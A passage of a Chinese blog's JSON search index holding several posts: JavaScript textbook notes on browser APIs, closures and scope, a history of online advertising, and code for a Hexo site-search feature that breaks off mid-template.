Pubsub.prototype.off = function(type){      this.hub[type] = [];    };    Pubsub.prototype.fire = function(type,fn){      var fns  = this.hub[type];  //有可能存了多个事件      if (!fns.length) {        console.log('无'+type+'订阅')      }      for (var i = 0; i &lt; fns.length; i++) {        fns[i]();      }    };    var user = new Pubsub;    function read(){      console.log(\"I'm reading\");    }    function read2(){      console.log(\"I'm recording\");    }    user.on('update',read);    user.on('update',read2);    user.fire('update');    user.off('update');    user.fire('update');\n拖放\n不太清除为何拖放这节内容会放在高级技巧中, 这里不再讲解.\n\nJS实现拖放的思路就是对一个DOM元素设置绝对定位, 然后根据鼠标的位置, 配合mouseDown/mouseUp/mouseMove事件来动态设置DOM元素的top/left值. 代码略\n\n本章完","url":"/2019/04/09/JSbook22/","link":"","plink":"https://thinkerchan.com/2019/04/09/JSbook22/"},{"title":"JS红皮书读书笔记-25-新兴的API","content":"requestAnimationFrame早期动画循环JS的动画很长时间以来都是使用计时器setInterval来达成的。就像这样：(function(){    function updateAnimations(){        doAnimation1();        doAnimation2();    }    setInterval(updateAnimations, 100);})()\n循环间隔的问题但是这样使用是有问题的，最大的问题就是时间间隔的问题。不能太长，否则看起来就会卡卡的，也不能太短，更新速度超过了屏幕的刷新速度会造成丢帧。\n而且浏览器的计时器其实精度是有限的，精度最高的chrome为4ms。且在页面没有显示在屏幕上的时候，大多数浏览器会对计时器的运行频率做出限制。这样的动画绘制机制就造成了绘制下一帧动画的时机我们并不能准确掌握。最好的结果应该是正好在屏幕刷新的那一刻绘制下一帧，也就是动画绘制的速度与电脑屏幕刷新速度一致。\n于是Mozilla就带头提出了requestAnimationFrame这个API, 如今这个API已经被标准化:function updateProgress(){    var div = document.getElementById(\"status\");    div.style.width = (parseInt(div.style.width, 10) + 5) + \"%\";    if (div.style.width != \"100%\"){        requestAnimationFrame(updateProgress);    }}requestAnimationFrame(updateProgress);\nPage Visibility API用户是否真的正在与页面交互是我们需要知道的。如果页面最小化了或隐藏起来了，那么有些功能是可以停下来的。API由3部分组成：\n\ndocument.hidden：表示页面是否隐藏的布尔值\ndocument.visibilityState：页面在后台，页面在前台，页面隐藏但正在被预览，页面在屏幕外执行预渲染处理\nvisibilitychange：在可见和不可见转换时触发的事件\n\nfunction handleVisibilityChange(){    var output = document.getElementById(\"myDiv\"),        msg;    if (document.hidden || document.msHidden || document.webkitHidden){        msg = \"Page is now hidden. \" + (new Date()) + \"&lt;br&gt;\";    } else {        msg = \"Page is now visible. \" + (new Date()) + \"&lt;br&gt;\";    }    output.innerHTML += msg;}EventUtil.addHandler(document, \"msvisibilitychange\", handleVisibilityChange);EventUtil.addHandler(document, \"webkitvisibilitychange\", handleVisibilityChange);\n可以看到多玩官网 就使用了上面相应的api, 页面没有显示的时候, title会改变.\nGeolocation API这个API让JS可以通过浏览器来获取用户的地理位置。当然，这是需要获得用户同意的。这个API在浏览器中的实现是navigator.geolocation。这个对象有3个方法：\n\ngetCurrentPosition(successFn,failFn,configObj): 通常用这个API获取经纬度\nwatchPosition: getCurrentPosition的定时版本\nclearWatch: 取消监控\n\nFile API不能直接访问用户计算机中的文件，一直都是 Web 应用开发中的一大障碍。2000 年以前，处理文件的唯一方式就是在表单中加入字段，仅此而已。File API（文件 API）的宗旨是为 Web 开发人员提供一种安全的方式，以便在客户端访问用户计算机中的文件，并更好地对这些文件执行操作。\nFile API 在表单中的文件输入字段的基础上，又添加了一些直接访问文件信息的接口。HTML5 在DOM 中为文件输入元素添加了一个 files 集合。在通过文件输入字段选择了一或多个文件时，files 集合中将包含一组 File 对象，每个 File 对象对应若一个文件。每个 File 对象都有下列只读属性。\n\nname：本地文件系统中的文件名。\nsize：文件的字节大小。\ntype：字符串，文件的 MIME 类型。\nlastModifiedDate：字符串，文件上一次被修改的时间（只有 Chrome 实现了这个属性）。\n\n举个例子，通过侦听 change 事件并读取 files 集合就可以知道选择的每个文件的信息：window.onload = function(){    var filesList = document.getElementById(\"files-list\");    EventUtil.addHandler(filesList, \"change\", function(event){        var info = \"\",            output = document.getElementById(\"output\"),            files = EventUtil.getTarget(event).files,            i = 0,            len = files.length;        while (i &lt; len){            info += files[i].name + \" (\" + files[i].type + \", \" + files[i].size + \" bytes)&lt;br&gt;\";            i++;        }        output.innerHTML = info;    });};\n上面的例子只是简单读取了文件的信息, 但是File API还能做得更多, FileReader能读取文件中的数据.\nFileReader类型FileReader 类型实现的是一种异步文件读取机制。可以把FileReader 想象成XMLHttpRequest， 区别只是它读取的是文件系统，而不是远程服务器。为了读取文件中的数据，FileReader 提供了如下几个方法。\n\nreadAsText(file,encoding)：以纯文本形式读取文件，将读取到的文本保存在 result 属性中。第二个参数用于指定编码类型，是可选的。\nreadAsDataURL(file)：读取文件并将文件以数据 URI 的形式保存在 result 属性中。\nreadAsBinaryString(file)：读取文件并将一个字符串保存在 result 属性中，字符串中的每个字符表示一字节。\nreadAsArrayBuffer(file) ：读取文件并将一个包含文件内容的 ArrayBuffer 保存在result 属性中。\n\n我们来看这个例子:&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;File API Example&lt;/title&gt;  &lt;script src=\"EventUtil.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;  &lt;p&gt;This page is a demonstration of the File API. This works in the latest versions of all major browsers, but you may need to place this file on a web server to get it to work.&lt;/p&gt;  &lt;p&gt;Select a file below.&lt;/p&gt;  &lt;input type=\"file\" id=\"files-list\"&gt;  &lt;script&gt;    window.onload = function(){      var filesList = document.getElementById(\"files-list\");      EventUtil.addHandler(filesList, \"change\", function(event){        var info = \"\",        output = document.getElementById(\"output\"),        progress = document.getElementById(\"progress\"),        files = EventUtil.getTarget(event).files,        type = \"default\",        reader = new FileReader();        if (/image/.test(files[0].type)){          reader.readAsDataURL(files[0]);          type = \"image\";        } else {          reader.readAsText(files[0]);          type = \"text\";        }        reader.onerror = function(){          output.innerHTML = \"Could not read file, error code is \" + reader.error.code;        };        reader.onprogress = function(event){          if (event.lengthComputable){            progress.innerHTML = event.loaded + \"/\" + event.total;          }        };        reader.onload = function(){          var html = \"\";          switch(type){            case \"image\":            html = \"&lt;img src=\\\"\" + reader.result + \"\\\"&gt;\";            break;            case \"text\":            html = reader.result;            break;          }          output.innerHTML = html;        };      });    };  &lt;/script&gt;  &lt;div id=\"progress\"&gt;&lt;/div&gt;  &lt;pre id=\"output\"&gt;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;\n读取部分内容略, 使用场景比较少.\n对象URL对象 URL 也被称为 blob URL，指的是引用保存在 File 或 Blob 中数据的 URL。使用对象 URL 的好处是可以不必把文件内容读取到 JavaScript 中而直接使用文件内容。为此，只要在需要文件内容的地方提供对象 URL 即可。\n使用方法:\nwindow.URL.createObjectURL(blob);\t\t//传入file对象或者blob\n当我们用第三方域名的图片(绝对地址)再canvas.toDataURL导出base64的时候, 浏览器会提示canvas被污染. 虽然我们可以对图片设置crossOrigin属性, 但还是存在兼容问题.\n此时利用window.URL.createObjectURL就能解决上述问题:\n&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;  &lt;meta charset=\"UTF-8\"&gt;  &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;img id=\"demo\"&gt;  &lt;script&gt;    var imgsrc = 'https://thinkerchan.com/images/avatar.jpg';    function getBase64(img){      var can = document.createElement('canvas');      can.width = 200;      can.height = 200;      var ctx= can.getContext('2d');      ctx.drawImage(img,0,0,200,200);      var base64 = can.toDataURL(\"image/jpeg\",0.6);      console.log(base64)      return base64;    }    function normalImg(src){      var img = new Image();      img.src =src;      img.crossOrigin = '';      img.onload = function(){        demo.src = getBase64(img);      }    }    normalImg(imgsrc); // safari报错    function getImageBlob(url, cb) {      var xhr          = new XMLHttpRequest();      xhr.open(\"get\", url, true);      xhr.responseType = \"blob\";      xhr.onload       = function() {        if (xhr.status == 200) {          cb &amp;&amp;cb(xhr.response);        }      };      xhr.send();    }    getImageBlob(imgsrc, function(res){      var src = window.URL.createObjectURL(res);  //利用这个能完美解决报错      var img = new Image();      img.src =src      img.onload = function(){        demo.src = getBase64(img);      }    })  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n读取拖放的文件&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;File API Example&lt;/title&gt;  &lt;script src=\"EventUtil.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;  &lt;p&gt;This page is a demonstration of the File API with Drag and Drop. This works in the latest versions of all major browsers, but you may need to place this file on a web server to get it to work.&lt;/p&gt;  &lt;div id=\"droptarget\" style=\"width: 500px; height: 200px; background: silver\"&gt;    Drop some files here  &lt;/div&gt;  &lt;script&gt;    window.onload = function(){      var droptarget = document.getElementById(\"droptarget\");      function handleEvent(event){        var info = \"\",          output = document.getElementById(\"output\"),          files, i, len;        EventUtil.preventDefault(event);        if (event.type == \"drop\"){          files = event.dataTransfer.files;          i = 0;          len = files.length;          while (i &lt; len){            info += files[i].name + \" (\" + files[i].type + \", \" + files[i].size + \" bytes)&lt;br&gt;\";            i++;          }          output.innerHTML = info;        }      }      EventUtil.addHandler(droptarget, \"dragenter\", handleEvent);      EventUtil.addHandler(droptarget, \"dragover\", handleEvent);      EventUtil.addHandler(droptarget, \"drop\", handleEvent);    };  &lt;/script&gt;  &lt;pre id=\"output\"&gt;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;\n使用XHR上传文件通过 File API 能够访问到文件内容，利用这一点就可以通过 XHR 直接把文件上传到服务器。当然啦，把文件内容放到 send()方法中，再通过 POST 请求，的确很容易就能实现上传。但这样做传递的是文件内容，因而服务器端必须收集提交的内容，然后再把它们保存到另一个文件中。\n其实，更好的做法是以表单提交的方式来上传文件。这样使用 FormData 类型就很容易做到了（第 21 章介绍过 FormData）。首先，要创建一个 FormData对象，通过它调用 append()方法并传入相应的 File 对象作为参数。然后，再把 FormData 对象传递给 XHR 的 send()方法，结果与通过表单上传一模一样:\nif (event.type == \"drop\"){  data = new FormData();    files = event.dataTransfer.files;    i = 0;    len = files.length;    while (i &lt; len){        data.append(\"file\" + i, files[i]);        i++;    }    xhr = new XMLHttpRequest();    xhr.open(\"post\", \"server.php\", true);    xhr.onreadystatechange = function(){        if (xhr.readyState == 4){            alert(xhr.responseText);        }    };    xhr.send(data);}\nWeb计时略, 性能优化的时候 再讲这个\nWebWorkers略, 另开一篇文章讲解\n\n本章完","url":"/2019/04/09/JSbook25/","link":"","plink":"https://thinkerchan.com/2019/04/09/JSbook25/"},{"title":"红皮书第七章学习心得","content":"变量变量类型 , 当一个值赋给变量时, 解析器必须确定这个值是基本类型还是引用类型\n\n基本类型: 简单的数据段,按值访问:  有Undefined / null / boolean / number / string\n引用类型: 多个值构成的对象 , 不能直接访问对象的内存空间. 实际操作的是它的引用(指针)\n\n区别这两个类型的区别:\n\n属性: 只有引用类型才能添加属性 , 基本类型无法添加.\n复制:\n\n基本类型: 复制一个数据副本.  新创建的变量完全是独立的.\n引用类型: 只是新建一个引用(指针) , 两个变量依然指向同一个内存空间.\n\n\n传递参数: 参数都是按值传递,且只能按值传递\n\n\n基本类型这个好理解,略\n引用类型:关键: 按值传递(非常重要)\n例子1:function setName(obj){obj.name='k'; //即使这个对象是按值传递, obj也会按引用来访问同一个对象. 造成了 按引用传递 的假象.}var person = new Object();setName(person);alert(person.name) //k\n例子2:function setName(obj){   obj.name=\"k\";   obj = new Object();   //如果是按引用传递,那么obj将被重写了, 输出的应该是x; 在这里,即使是在函数内部改变了参数的值,原始引用依然会保持不变.   obj.name=\"x\"; //并且这个新的obj将引用一个局部对象, 这个局部对象在函数执行完之后立即销毁.}   var person = new Object();   setName(person);   alert(person.name);              //k\n例子3:function setName(obj){   // obj.name=\"k\";   obj = new Object();            //证明了这个是局部对象. 函数执行后被销毁.   obj.name=\"x\"; } var person = new Object(); setName(person); alert(person.name);              //undefined\n检测方式\ntypeof （基本类型检测方式）\ninstanceof （引用类型检测方式）\n\n注意事项仅仅用typeof或者instanceof来检测引用类型都可能是不靠谱的,为什么不靠谱呢?\n以下解释引自红皮书第22章:\n\n   Safari（直至第 4 版）在对正则表达式应用typeof操作符时会返回”function”，因此很难确定某个值到底是不是函数。    instanceof操作符在存在多个全局作用域（像一个页面包含多个frame）的情况下，也是问题多多。\n\n如:var isArray = value instanceof Array;\n以上代码要返回true，value必须是一个数组，而且还必须与Array构造函数在同个全局作用域中。（别忘了， Array 是 window 的属性。）如果 value 是在另个 frame 中定义的数组，那么以上代码就会返回 false。\n所以解决办法是什么呢?Object.prototype.toString.call(value)\n用这来检测引用类型才是最稳妥的\n执行环境和作用域全局环境就是window对象所以的全局变量和函数都是作为window对象的属性和方法创建的.(执行幻境中所有的代码执行完之后,环境就会被销毁,环境内的变量和函数定义也会被销毁)每个函数都有自己的执行环境, 函数在执行时, 函数的环境就会被推入一个环境栈中,然后创建变量对象的 作用域链 , 其作用是保证执行环境对变量和函数的有序访问.执行完之后再弹出.\n在函数中,作用域链的最前端是arguments对象,然后逐级向外读取变量,直到全局,全局环境的变量对象始终是作用域链的最后一个对象.\n函数声明方式通常使用以下两种方式:\n函数声明function fname(arg0, arg1, arg2 ){    //...}\n函数声明的重要特征是: 函数声明提升, 在执行代码之前会先读取函数声明. 即便把函数声明放在执行代码的后面也如此.\n函数表达式(匿名函数)var fname=function(arg0, arg1, arg2 ){    //...}if(condition){    function sayHi(){ //不能再if语句能使用函数声明!    alert(1);    }} else{    function sayhi(){        alert(2);    }}if(condition){    sayHi = function(){ //函数表达式没有提升作用        alert(1);    }} else{    sayhi = function(){        alert(2);    }}\n匿名函数常常当成值来使用. 但是不是它的唯一作用.\n递归这是常见的递归函数function recursive(i){    if(i&lt;=1){     return i;    } else {    //常见的思路是这里写函数名,但是万一本身这个函数名需要更改,就得改动两处    //return i*recurive(i-1);    //所以我们用agruments.callee来替代     return i*arguments.callee;    }}\n再看一个例子function factorial(num){    if (num &lt;= 1){        return 1;    } else {        return num * factorial(num-1); //注意 : 报错是因为这里用了固定的函数名!!!        // return num * arguments.callee(num-1); //应该这样写    }}var anotherFactorial = factorial;   //函数别名factorial = null;   //去除名字    alert(factorial(4));  //error!alert(anotherFactorial(4)); //如果不改动factorial(num-1),那就会报错\n所以函数名只是一个地址\n闭包和匿名函数闭包, 是有权访问另一个函数作用域中的变量的函数(注意闭包是函数).常见的闭包创建方式, 在一个函数的内部创建另一个函数.\n当函数第一次被调用时,会创建一个执行环境以及相应的作用域链并把作用域链赋给一个特殊的内部属性[[scope]],然后使用this arguments和其他参数来初始化活动对象(即变量),但在作用域链中外部函数的活动对象逐级增加.\n例如:function compare(v1, v2){    if(v1 &lt; v2){        return -1;    } else if(v1 &gt; v2){        return 1;    } else{        return 0;    }}var result = compare(5 ,10);\ncompare内会创建this , arguments ,v1 , v2 的活动对象.全局执行环节的变量对象 this result compare处于第二位.\n作用域链本质上是一个执行变量对象的指针列表,它只引用但不实际包含变量对象.一般来说,函数执行完之后, 局部活动对象就会被销毁, 内存中只保留全局作用域.\n但是闭包不一样.比如说,下面这个例子,我们一看以为值是My Object,但是并非如此.var name = \"The Window\";var object = {name : \"My Object\",getNameFunc : function(){  return function(){    return this.name;    };  }};alert(object.getNameFunc()())  //The Window\n如果要达到期待的效果:var name = \"The Window\";var object = {name : \"My Object\",getNameFunc : function(){  var that = this;     //this = object,缓存这个想要访问的环境即可  return function(){    return that.name;  };}}; alert(object.getNameFunc()()); //My Object\n闭包与变量典型的闭包: function f1(){    var n=999;    function f2(){        alert(n); // 999    }}\n作用域链这种配置机制出现一个副作用,闭包只能取得包含函数中任何变量的最后一个值. 因为闭包(是一个函数), 保存的是整个对象,而不是某个特殊的对象.\n例子1:function cf(){          var result = new Array();          for(var i = 0; i&lt;10 ; i++){               result[i]=function(){                    return i;               }          }          return result;     }     var fns=cf();     for(var i=0 ; i&lt;10;i++){          document.write(fns[i]()+'&lt;br&gt;');//10个10     }\n例子2:function cf(){          var result = new Array();          for(var i = 0; i&lt;10 ; i++){               result[i]=function(num){                    return function(){                         return num;                     }               }//这里没有i          }          return result;     }     var fns=cf();     for(var i=0 ; i&lt;10;i++){          document.write(fns[i]()+'&lt;br&gt;');     }\n例子3:function cf(){          var result = new Array();          for(var i = 0; i&lt;10 ; i++){               result[i]=function(num){                    return function(){                         return num;                     }               }(i)          }          return result;     }     var fns=cf();     for(var i=0 ; i&lt;10;i++){          document.write(fns[i]()+'&lt;br&gt;');     }\nThis对象     this对象是基于函数执行环境绑定的, 全局环境中, this==window, 函数为某个对象的方法时且被调用时, this为当前对象.     但是匿名函数的指向环境具有全局性 ,通常指向window. 由于闭包的写法不一样, 可能不太明显var name = \"The Window\";       var object = {           name : \"My Object\",           getName: function(){               return this.name;           }       };       alert(object.getName());     //\"My Object\"       alert((object.getName)());   //\"My Object\"       alert(object.getName)          //这里会输出函数的所有代码.       alert((object.getName=object.getName)());  // 所以这里实际上就是将匿名函数放在了全局环境中.因此指向window.       //注意以下写法      var x=10;      alert(x=x);     //10\n闭包与内存泄露以下代码容易发生无意识内存泄露:function fn(){    var el = document.getElementById('el');    el.onclick=function(){        this.style.color=\"red\";    }}\n这段代码获取一个DOM元素并为其设置字体颜色,但它已经发生了内存泄露,为什么?因为el的引用放在了匿名函数中.这在函数内部和本地对象(el)创建了一个循环引用.\n改进方法:function fn(){    document.getElementById('el').onclick=function(){        this.style.color=\"red\";    }}","url":"/2015/02/05/chapter-7/","link":"","plink":"https://thinkerchan.com/2015/02/05/chapter-7/"},{"title":"计算广告系列-在线广告发展简史","content":"本文讲述线广告的发展简史： 从合约广告到竞价广告的过程\n有兴趣的朋友可以翻翻之前写的：\n\n《广告相关的基本概念》\n《竞拍模式》\n《一张图告诉你什么是计算广告》\n\n第一个吃螃蟹的人\n让我们回到1994年10月27日,  美国通信巨头AT&amp;T在hotwired.com(一个无线杂志网站)投下了史上第一个在线banner广告. 当时AT&amp;T为该广告支付了$30,000，投放是以CPD(cost per day)的形式，为期3个月。广告的点击率高达44%，从此掀起了互联网广告革命的浪潮.\n\n有人还写了个网站特地纪念这个广告, 有兴趣可以自行查看:\n\n Thefirstbannerad.com\n\n\n在线广告为什么会诞生那时的在线媒体(如 AOL、Yahoo! 等网站)刚刚产生不久。他们已经取得了不错的流量规模，可是投资人当然希望这些媒体也能够给他们带来真金白银。 \n要对这些线上流量进行变现，最直接的方法就是把网站的 HTML 页面当成杂志的版面，在里面插入广告位，于是就有了开头AT&amp;T公司投放第一个广告的实例。\n线下的广告代理公司也就把这些网站当成 一本本新的杂志，按原来的思路和逻辑进行采买。这种在互联网上展示广告创意的产品形式称为展示广告(display advertising)，也叫显示广告。\n利益驱动下的发展合约广告在线广告最初的售卖和传统广告售卖模式没什么不同, 都为合约广告(agreement-based advertising)，即采用合同约定的方式确定某一广告位在某 一时间段为某特定广告主所独占，并且根据双方的要求，确定广告创意和投放策略。\n此时的广告并不涉及到计算要求, 只需要的把广告主的创意作为一个 HTML 的片段插入到媒体的页面中按照时间周期展示完毕即可。\n定向广告假设按照正常的发展规律，广告主在经过充分的展示之后， 品牌知名度上去了，那它再为自己投放广告的动力必然下降。这么一搞，势必影响互联网媒体的收入啊 ，在利益驱动下，互联网广告运营者们经过探索，很快就发现了在线广告不同于传统媒体广告的本质特 点:\n\n可以对不同的受众呈现不同的广告\n\n在今天看来再平常不过的这个观念，实际上是在线广告的效果和市场规模不断发展的核心驱动力。\n认识到这一点，互联网媒体又光明正大地提高广告报价。\n“宝吉老哥啊， 您不是又卖剃须刀又卖化妆品吗？您这次在我这投的是化妆品广告，我们的网站男用看了也不感兴趣，怎么记得住呢！小弟刚刚研发了一个技术，能针对性别来展示不同产品的广告，老哥您要不考虑考虑来份这个套餐？”\n“小伙子可以啊，这样就不会浪费掉那部分男用户了！ 那怎么算价格啊？”\n“不贵不贵！只要$888…888”\n“……”\n\n以上情景的广告投放方式称为定向广告(targeted advertising)。此时，广告系统已经对计算技术产生了两个具体需求:\n\n一是受众定向(audience targeting)，即通 过技术手段标定某个用户的性别、年龄或其他标签;\n二是广告投放(ad serving)，即将广 告投送由直接嵌入页面变为实时响应前端请求，并根据用户标签自动决策和返回合适受众的广告。\n\n由于从传统的品牌广告延伸而来，此时的定向广告仍然以合约的方式进行。媒体 向广告主保证某个投放量，并在此基础上确定合同的总金额以及投放量未完成情况下的赔 偿方案。\n这种担保式投送(Guaranteed Delivery，GD)的交易方式逐渐成为互联网合约式 广告的主要商业模式。一般来说，这样的合约仍然主要面向品牌广告主，并且遵循按千次展示付费(Cost per Mille，CPM)的计费方式。 \n竞价广告合约广告系统中有一个重要的计算问题，即在满足各合约目标受众量要求的同时尽可能为所有广告商分配到质更好的流量。\n这一问题有两个难点:\n\n如何有效地将流量分配到各个合约互相交叉的人群覆盖上 \n在 在线的环境下实时地完成每一次展示决策\n\n这个问题我们称为 在线分配(online allocation)问题, 如果将各合约的量看作约束条件，将某种度 量下的质看作目标函数，可以利用带约束优化(constrained optimization)的数学框架来探索这一问题。 \n需要注意，展示广告领域定向投放的最初动机是供给方为了拆分流量以获得更高的营收。如果一开始(就是广告主还不太多的时期)就提供非常精细的定向，反而会造成售卖率的下降。\n 为了帮助理解，可以这么打个比喻： \n\n你在搜索引擎里面输入的词条，代表你想售卖的流量，比如搜索 ”喝酒男人“，这时候搜索引擎会展示非常多相关的结果(说明符合条件的广告主多)。但是你想搜索”喝酒写代码并且经常加班单身的女装大佬阿宾“，那搜索引擎只会对你显示 - 很抱歉，没有找到和此词条相关的结果(即没有符合条件的广告主)。\n\n\n找不到“喝酒写代码并且经常加班单身的女装大佬阿宾”\n\n所以，最初(注意这个词)的定向标签往往都设置在较粗的粒度上。但是这实际上是和广告主的需求是产生矛盾的。假如广告主想投一个广告，希望它能在短时间带来更大的购买行为，流量标签当然是约精细越好。但是如果真的这么干， 就有点”只为树木， 不为森林“的意思。\n所以先满足大部分的广告主，毕竟他们才是金主，否则没钱，谁都玩不转。等到市场的规模越来越大后，市场才能向着更精细化的方向快速发展，达到一个良性循环。\n这种情况下的发展主要有两方面的趋势:\n\n一是定向标签变得越来越精准\n二是广告主的数量不断膨胀\n\n在这些趋势下，仍然按照合约的方式售卖广告会遇到越来越多的麻烦。首先， 很难对这些细粒度标签组合的流量做准确预估;其次，当一次展示同时满足多个合约的时候，仅仅按照量约束下的在线分配策略进行决策有可能浪费掉了很多本来可以卖得更贵的 流量。\n既然量的约束带来了这些麻烦，有没有可能抛弃量的保证而采用最唯利是图的策略 来进行广告决策?这样的思路催生了计算广告历史上革命性的产品模式——竞价广告 (auction-based advertising)。在这种模式下，供给方只向广告主保证质即单位流量的成 本，但不再以合约的方式给出量的保证，换言之，对每一次展示都基本按照收益最高的原 则来决策。 \n都是月亮惹的祸上面是广告竞价产生的原因（这么想想好像也没错），实际历史的足迹却并非如此。\n以 Google 为代表的搜索引擎在技术成熟以后，搜索广告(search ad)的价值瞬间就被人挖掘起来，  搜索引擎也不是什么媒体站点， 它是拥有巨大流量（金矿）的上网入口。既然搜索关键词价值大，价值大的东西想卖出去，人类是怎么处理的？没错， 就是竞价。\n因此搜索流量的变现也采用了与服务自然结合的付费搜索(paid search 或 sponsored search)模式。从广告的视角来看，也可以把付费搜索 看作一种定向广告，即根据用户的即时兴趣定向投送的广告，而即时兴趣的标签就是关键 词。\n搜索广告产生了巨大的收益以后，其他媒体也意识到他们的标签（比如用户特征标签）也能用竞价的方式售卖给广告主。\n从宏观市场上看，竞价广告与合约广告有很大的不同。没有了合约的保证，大量的广 告主处在一个多方博弈的环境中。与直觉不同的是，在如何收取广告主费用这一点上，我 们并非按照微观上最优的方案实施就可以达到整个市场最大的收益。\n关于定价机制的深入 研究，产生了广义第二高价(Generalized Second Price，GSP)这一竞价重要的理论 。\n\n本次分享完毕，下篇我再讲讲一些有意思的， 比如说:\n\n为什么竞拍模式要用广义第二高价竞价理论？\n\n谢谢各位.\n欢迎关注我的公众号: 测试狗","url":"/2019/03/22/dev-of-computational-advertising/","link":"","plink":"https://thinkerchan.com/2019/03/22/dev-of-computational-advertising/"},{"title":"【快速教程】Hexo站内搜索的实现","content":"源码本主题站内搜索的实现, 可从标题和内容中搜索单个或多个词条，详情看源码。\n&lt;article&gt;  &lt;h1 class=\"title\"&gt;&lt;%= page.title  %&gt; &lt;/h1&gt;  &lt;div class=\"entry-content wrapper\"&gt;    &lt;div id=\"search\"&gt;      &lt;input type=\"text\" placeholder=\"请输入关键字\" id=\"Jinput\"&gt;    &lt;/div&gt;    &lt;div class=\"info\"&gt;      本次搜索结果共&lt;span id=\"Jcount\"&gt;0&lt;/span&gt;条    &lt;/div&gt;    &lt;div id=\"JresList\"&gt;&lt;/div&gt;    &lt;%    let posts = site.posts.data    let searchData = []    posts.forEach(item =&gt; {      searchData.push({        title: trim(item.title),        content: trim(strip_html(item.content)).replace(/&amp;#123;/g,'{').replace(/&amp;#125;/g,'}'),        url:'/'+item.path,        link: item.link,        plink: item.permalink      })    });    let _searchData = JSON.stringify(searchData)  %&gt;    &lt;script&gt;      let searchData = &lt;%- _searchData %&gt;        let searchMod = {          searchTitle: true, //  是否在标题中搜索          searchContent: 1, // 是否在内容中搜索          contentPieces: 2, // 内容切割块数          excludes: ['{{', '}}', '{', '}', '.', '/', '\\\\', '。'], // 粗略过滤部分字符串          contentDecoration: 50, // 内容命中关键字增加前后50个字          roughFetch: false, // 是否粗略提取, 仅对文本内容有效          trimStr(str) {            return str.trim().toLowerCase()          },          init(input) {            input.addEventListener('input', (e) =&gt; {              let searchText = this.trimStr(input.value)              this.fetchTxtFromDB(searchText, searchData)            });          },          fetchTxtFromDB(searchText, DB) {            let resultArr = []            if (searchText) {              let searchTextArr = searchText.split(/[\\s\\-]+/); // 非首尾空格分割词条              searchTextArr = searchTextArr.filter((item) =&gt; {                return !this.excludes.includes(item);              })              if (searchTextArr.length &gt; 1) {                searchTextArr.push(searchText); // 保留原始词条做完全匹配              }              resultArr = DB.filter((item) =&gt; {                let articleTitle = this.trimStr(item.title);                let titleHitArr = []                item.tmpTitleArr = []                item._title = ''                let articleContent = this.trimStr(item.content);                let contentHitArr = []                item.tmpContentArr = []                item.indexArr = []  // 词条在内容中第一次出现的位置                item._content = '' // 存储已经高亮关键字的原文                item._contentSliceArr = [] // 存储截取后的原文碎片                searchTextArr.map((one, index) =&gt; { // 求出searchTextArr有多少个命中的词条                  if (this.searchTitle) {                    let b = articleTitle.indexOf(one) &gt; -1;                    b &amp;&amp; titleHitArr.push(one)                  }                  if (this.searchContent) {                    let b2 = articleContent.indexOf(one) &gt; -1                    b2 &amp;&amp; contentHitArr.push(one)                  }                })                if (this.searchTitle &amp;&amp; titleHitArr.length) {                  titleHitArr.map((one, index) =&gt; {                    let keyWordHtml = this.keyWordTpl().replace(/{{searchText}}/, one),                      titleArrWithoutKeyWord = (!index ? articleTitle : item.tmpTitleArr[index - 1]).split(one), // 用数组切割的方式把所有文本内包含的关键词替换出来, 下一次的分割依赖上一次分割结果                      highlightTxt = titleArrWithoutKeyWord.join(keyWordHtml);                    item.tmpTitleArr.push(highlightTxt); // 记录前一次的结果,用于下一次计算                    item._title = highlightTxt; // 最后一次为最终结果                  })                  delete item.tmpTitleArr                }                if (this.searchContent &amp;&amp; contentHitArr.length) {                  contentHitArr.map((one, index) =&gt; {                    if (this.roughFetch) { // 先高亮后截取(可能造成高亮标签切割问题)                      let keyWordHtml = this.keyWordTpl().replace(/{{searchText}}/, one),                        contentArrWithoutKeyWord = (!index ? articleContent : item.tmpContentArr[index - 1]).split(one),                        highlightTxt = contentArrWithoutKeyWord.join(keyWordHtml);                      item.tmpContentArr.push(highlightTxt);                      item._content = highlightTxt;                    } else {                      item.indexArr.push({                        start: articleContent.indexOf(one), // 记录词条第一次出现的位置，和词条的长度                        length: one.length,                        str: one,                      })                    }                  })                  item.indexArr.map((one, index) =&gt; { // 有可能把&lt;b&gt;标签给切割了,造成样式异常, 需要另外处理                    let keyWordEndPosition = one.start + one.length // 词条的结束位置,用于计算截取长度                    let content = this.roughFetch ? item._content : item.content;                    let contentLen = content.length;                    if (one.start &gt; this.contentDecoration) {                      let highLightEndPosition = keyWordEndPosition + this.contentDecoration                      highLightEndPosition = highLightEndPosition &gt; contentLen ? contentLen : highLightEndPosition                      item._contentSliceArr.push('...'+content.slice(one.start - this.contentDecoration, highLightEndPosition) + '...')                    } else {                      let highLightEndPosition = keyWordEndPosition + this.contentDecoration * 2                      highLightEndPosition = highLightEndPosition &gt; contentLen ? contentLen : highLightEndPosition                      item._contentSliceArr.push('...'+content.slice(0, highLightEndPosition) + '...')                    }                  })                  if (!this.roughFetch) {                    contentHitArr.map((one, index) =&gt; {                      let keyWordHtml = this.keyWordTpl().replace(/{{searchText}}/, one),                        contentArrWithoutKeyWord = (!index ? item._contentSliceArr.join('&lt;i style=\"display:block;padding-top:10px\"&gt;&lt;/i&gt;') : item.tmpContentArr[index - 1]).split(one),                        highlightTxt = contentArrWithoutKeyWord.join(keyWordHtml);                      item.tmpContentArr.push(highlightTxt);                      item._content = highlightTxt                    })                  }                  delete item.tmpContentArr                  delete item._contentSliceArr                  delete item.indexArr                }                return (this.searchTitle &amp;&amp; titleHitArr.length) || (this.searchContent &amp;&amp; contentHitArr.length)              })            }            this.resultArr = resultArr;            this.render(JresList, Jcount, resultArr)          },          render(ele, countEle, resultArr) {            let htmlArr = resultArr.map((item) =&gt; {              return this.itemTpl()                .replace(/{{url}}/g, item.url)                .replace(/{{title}}/g, item._title || item.title)                .replace(/{{content}}/g, item._content)            })            ele.innerHTML = htmlArr.join('')            countEle.innerHTML = htmlArr.length          },          itemTpl() {            return `            &lt;li 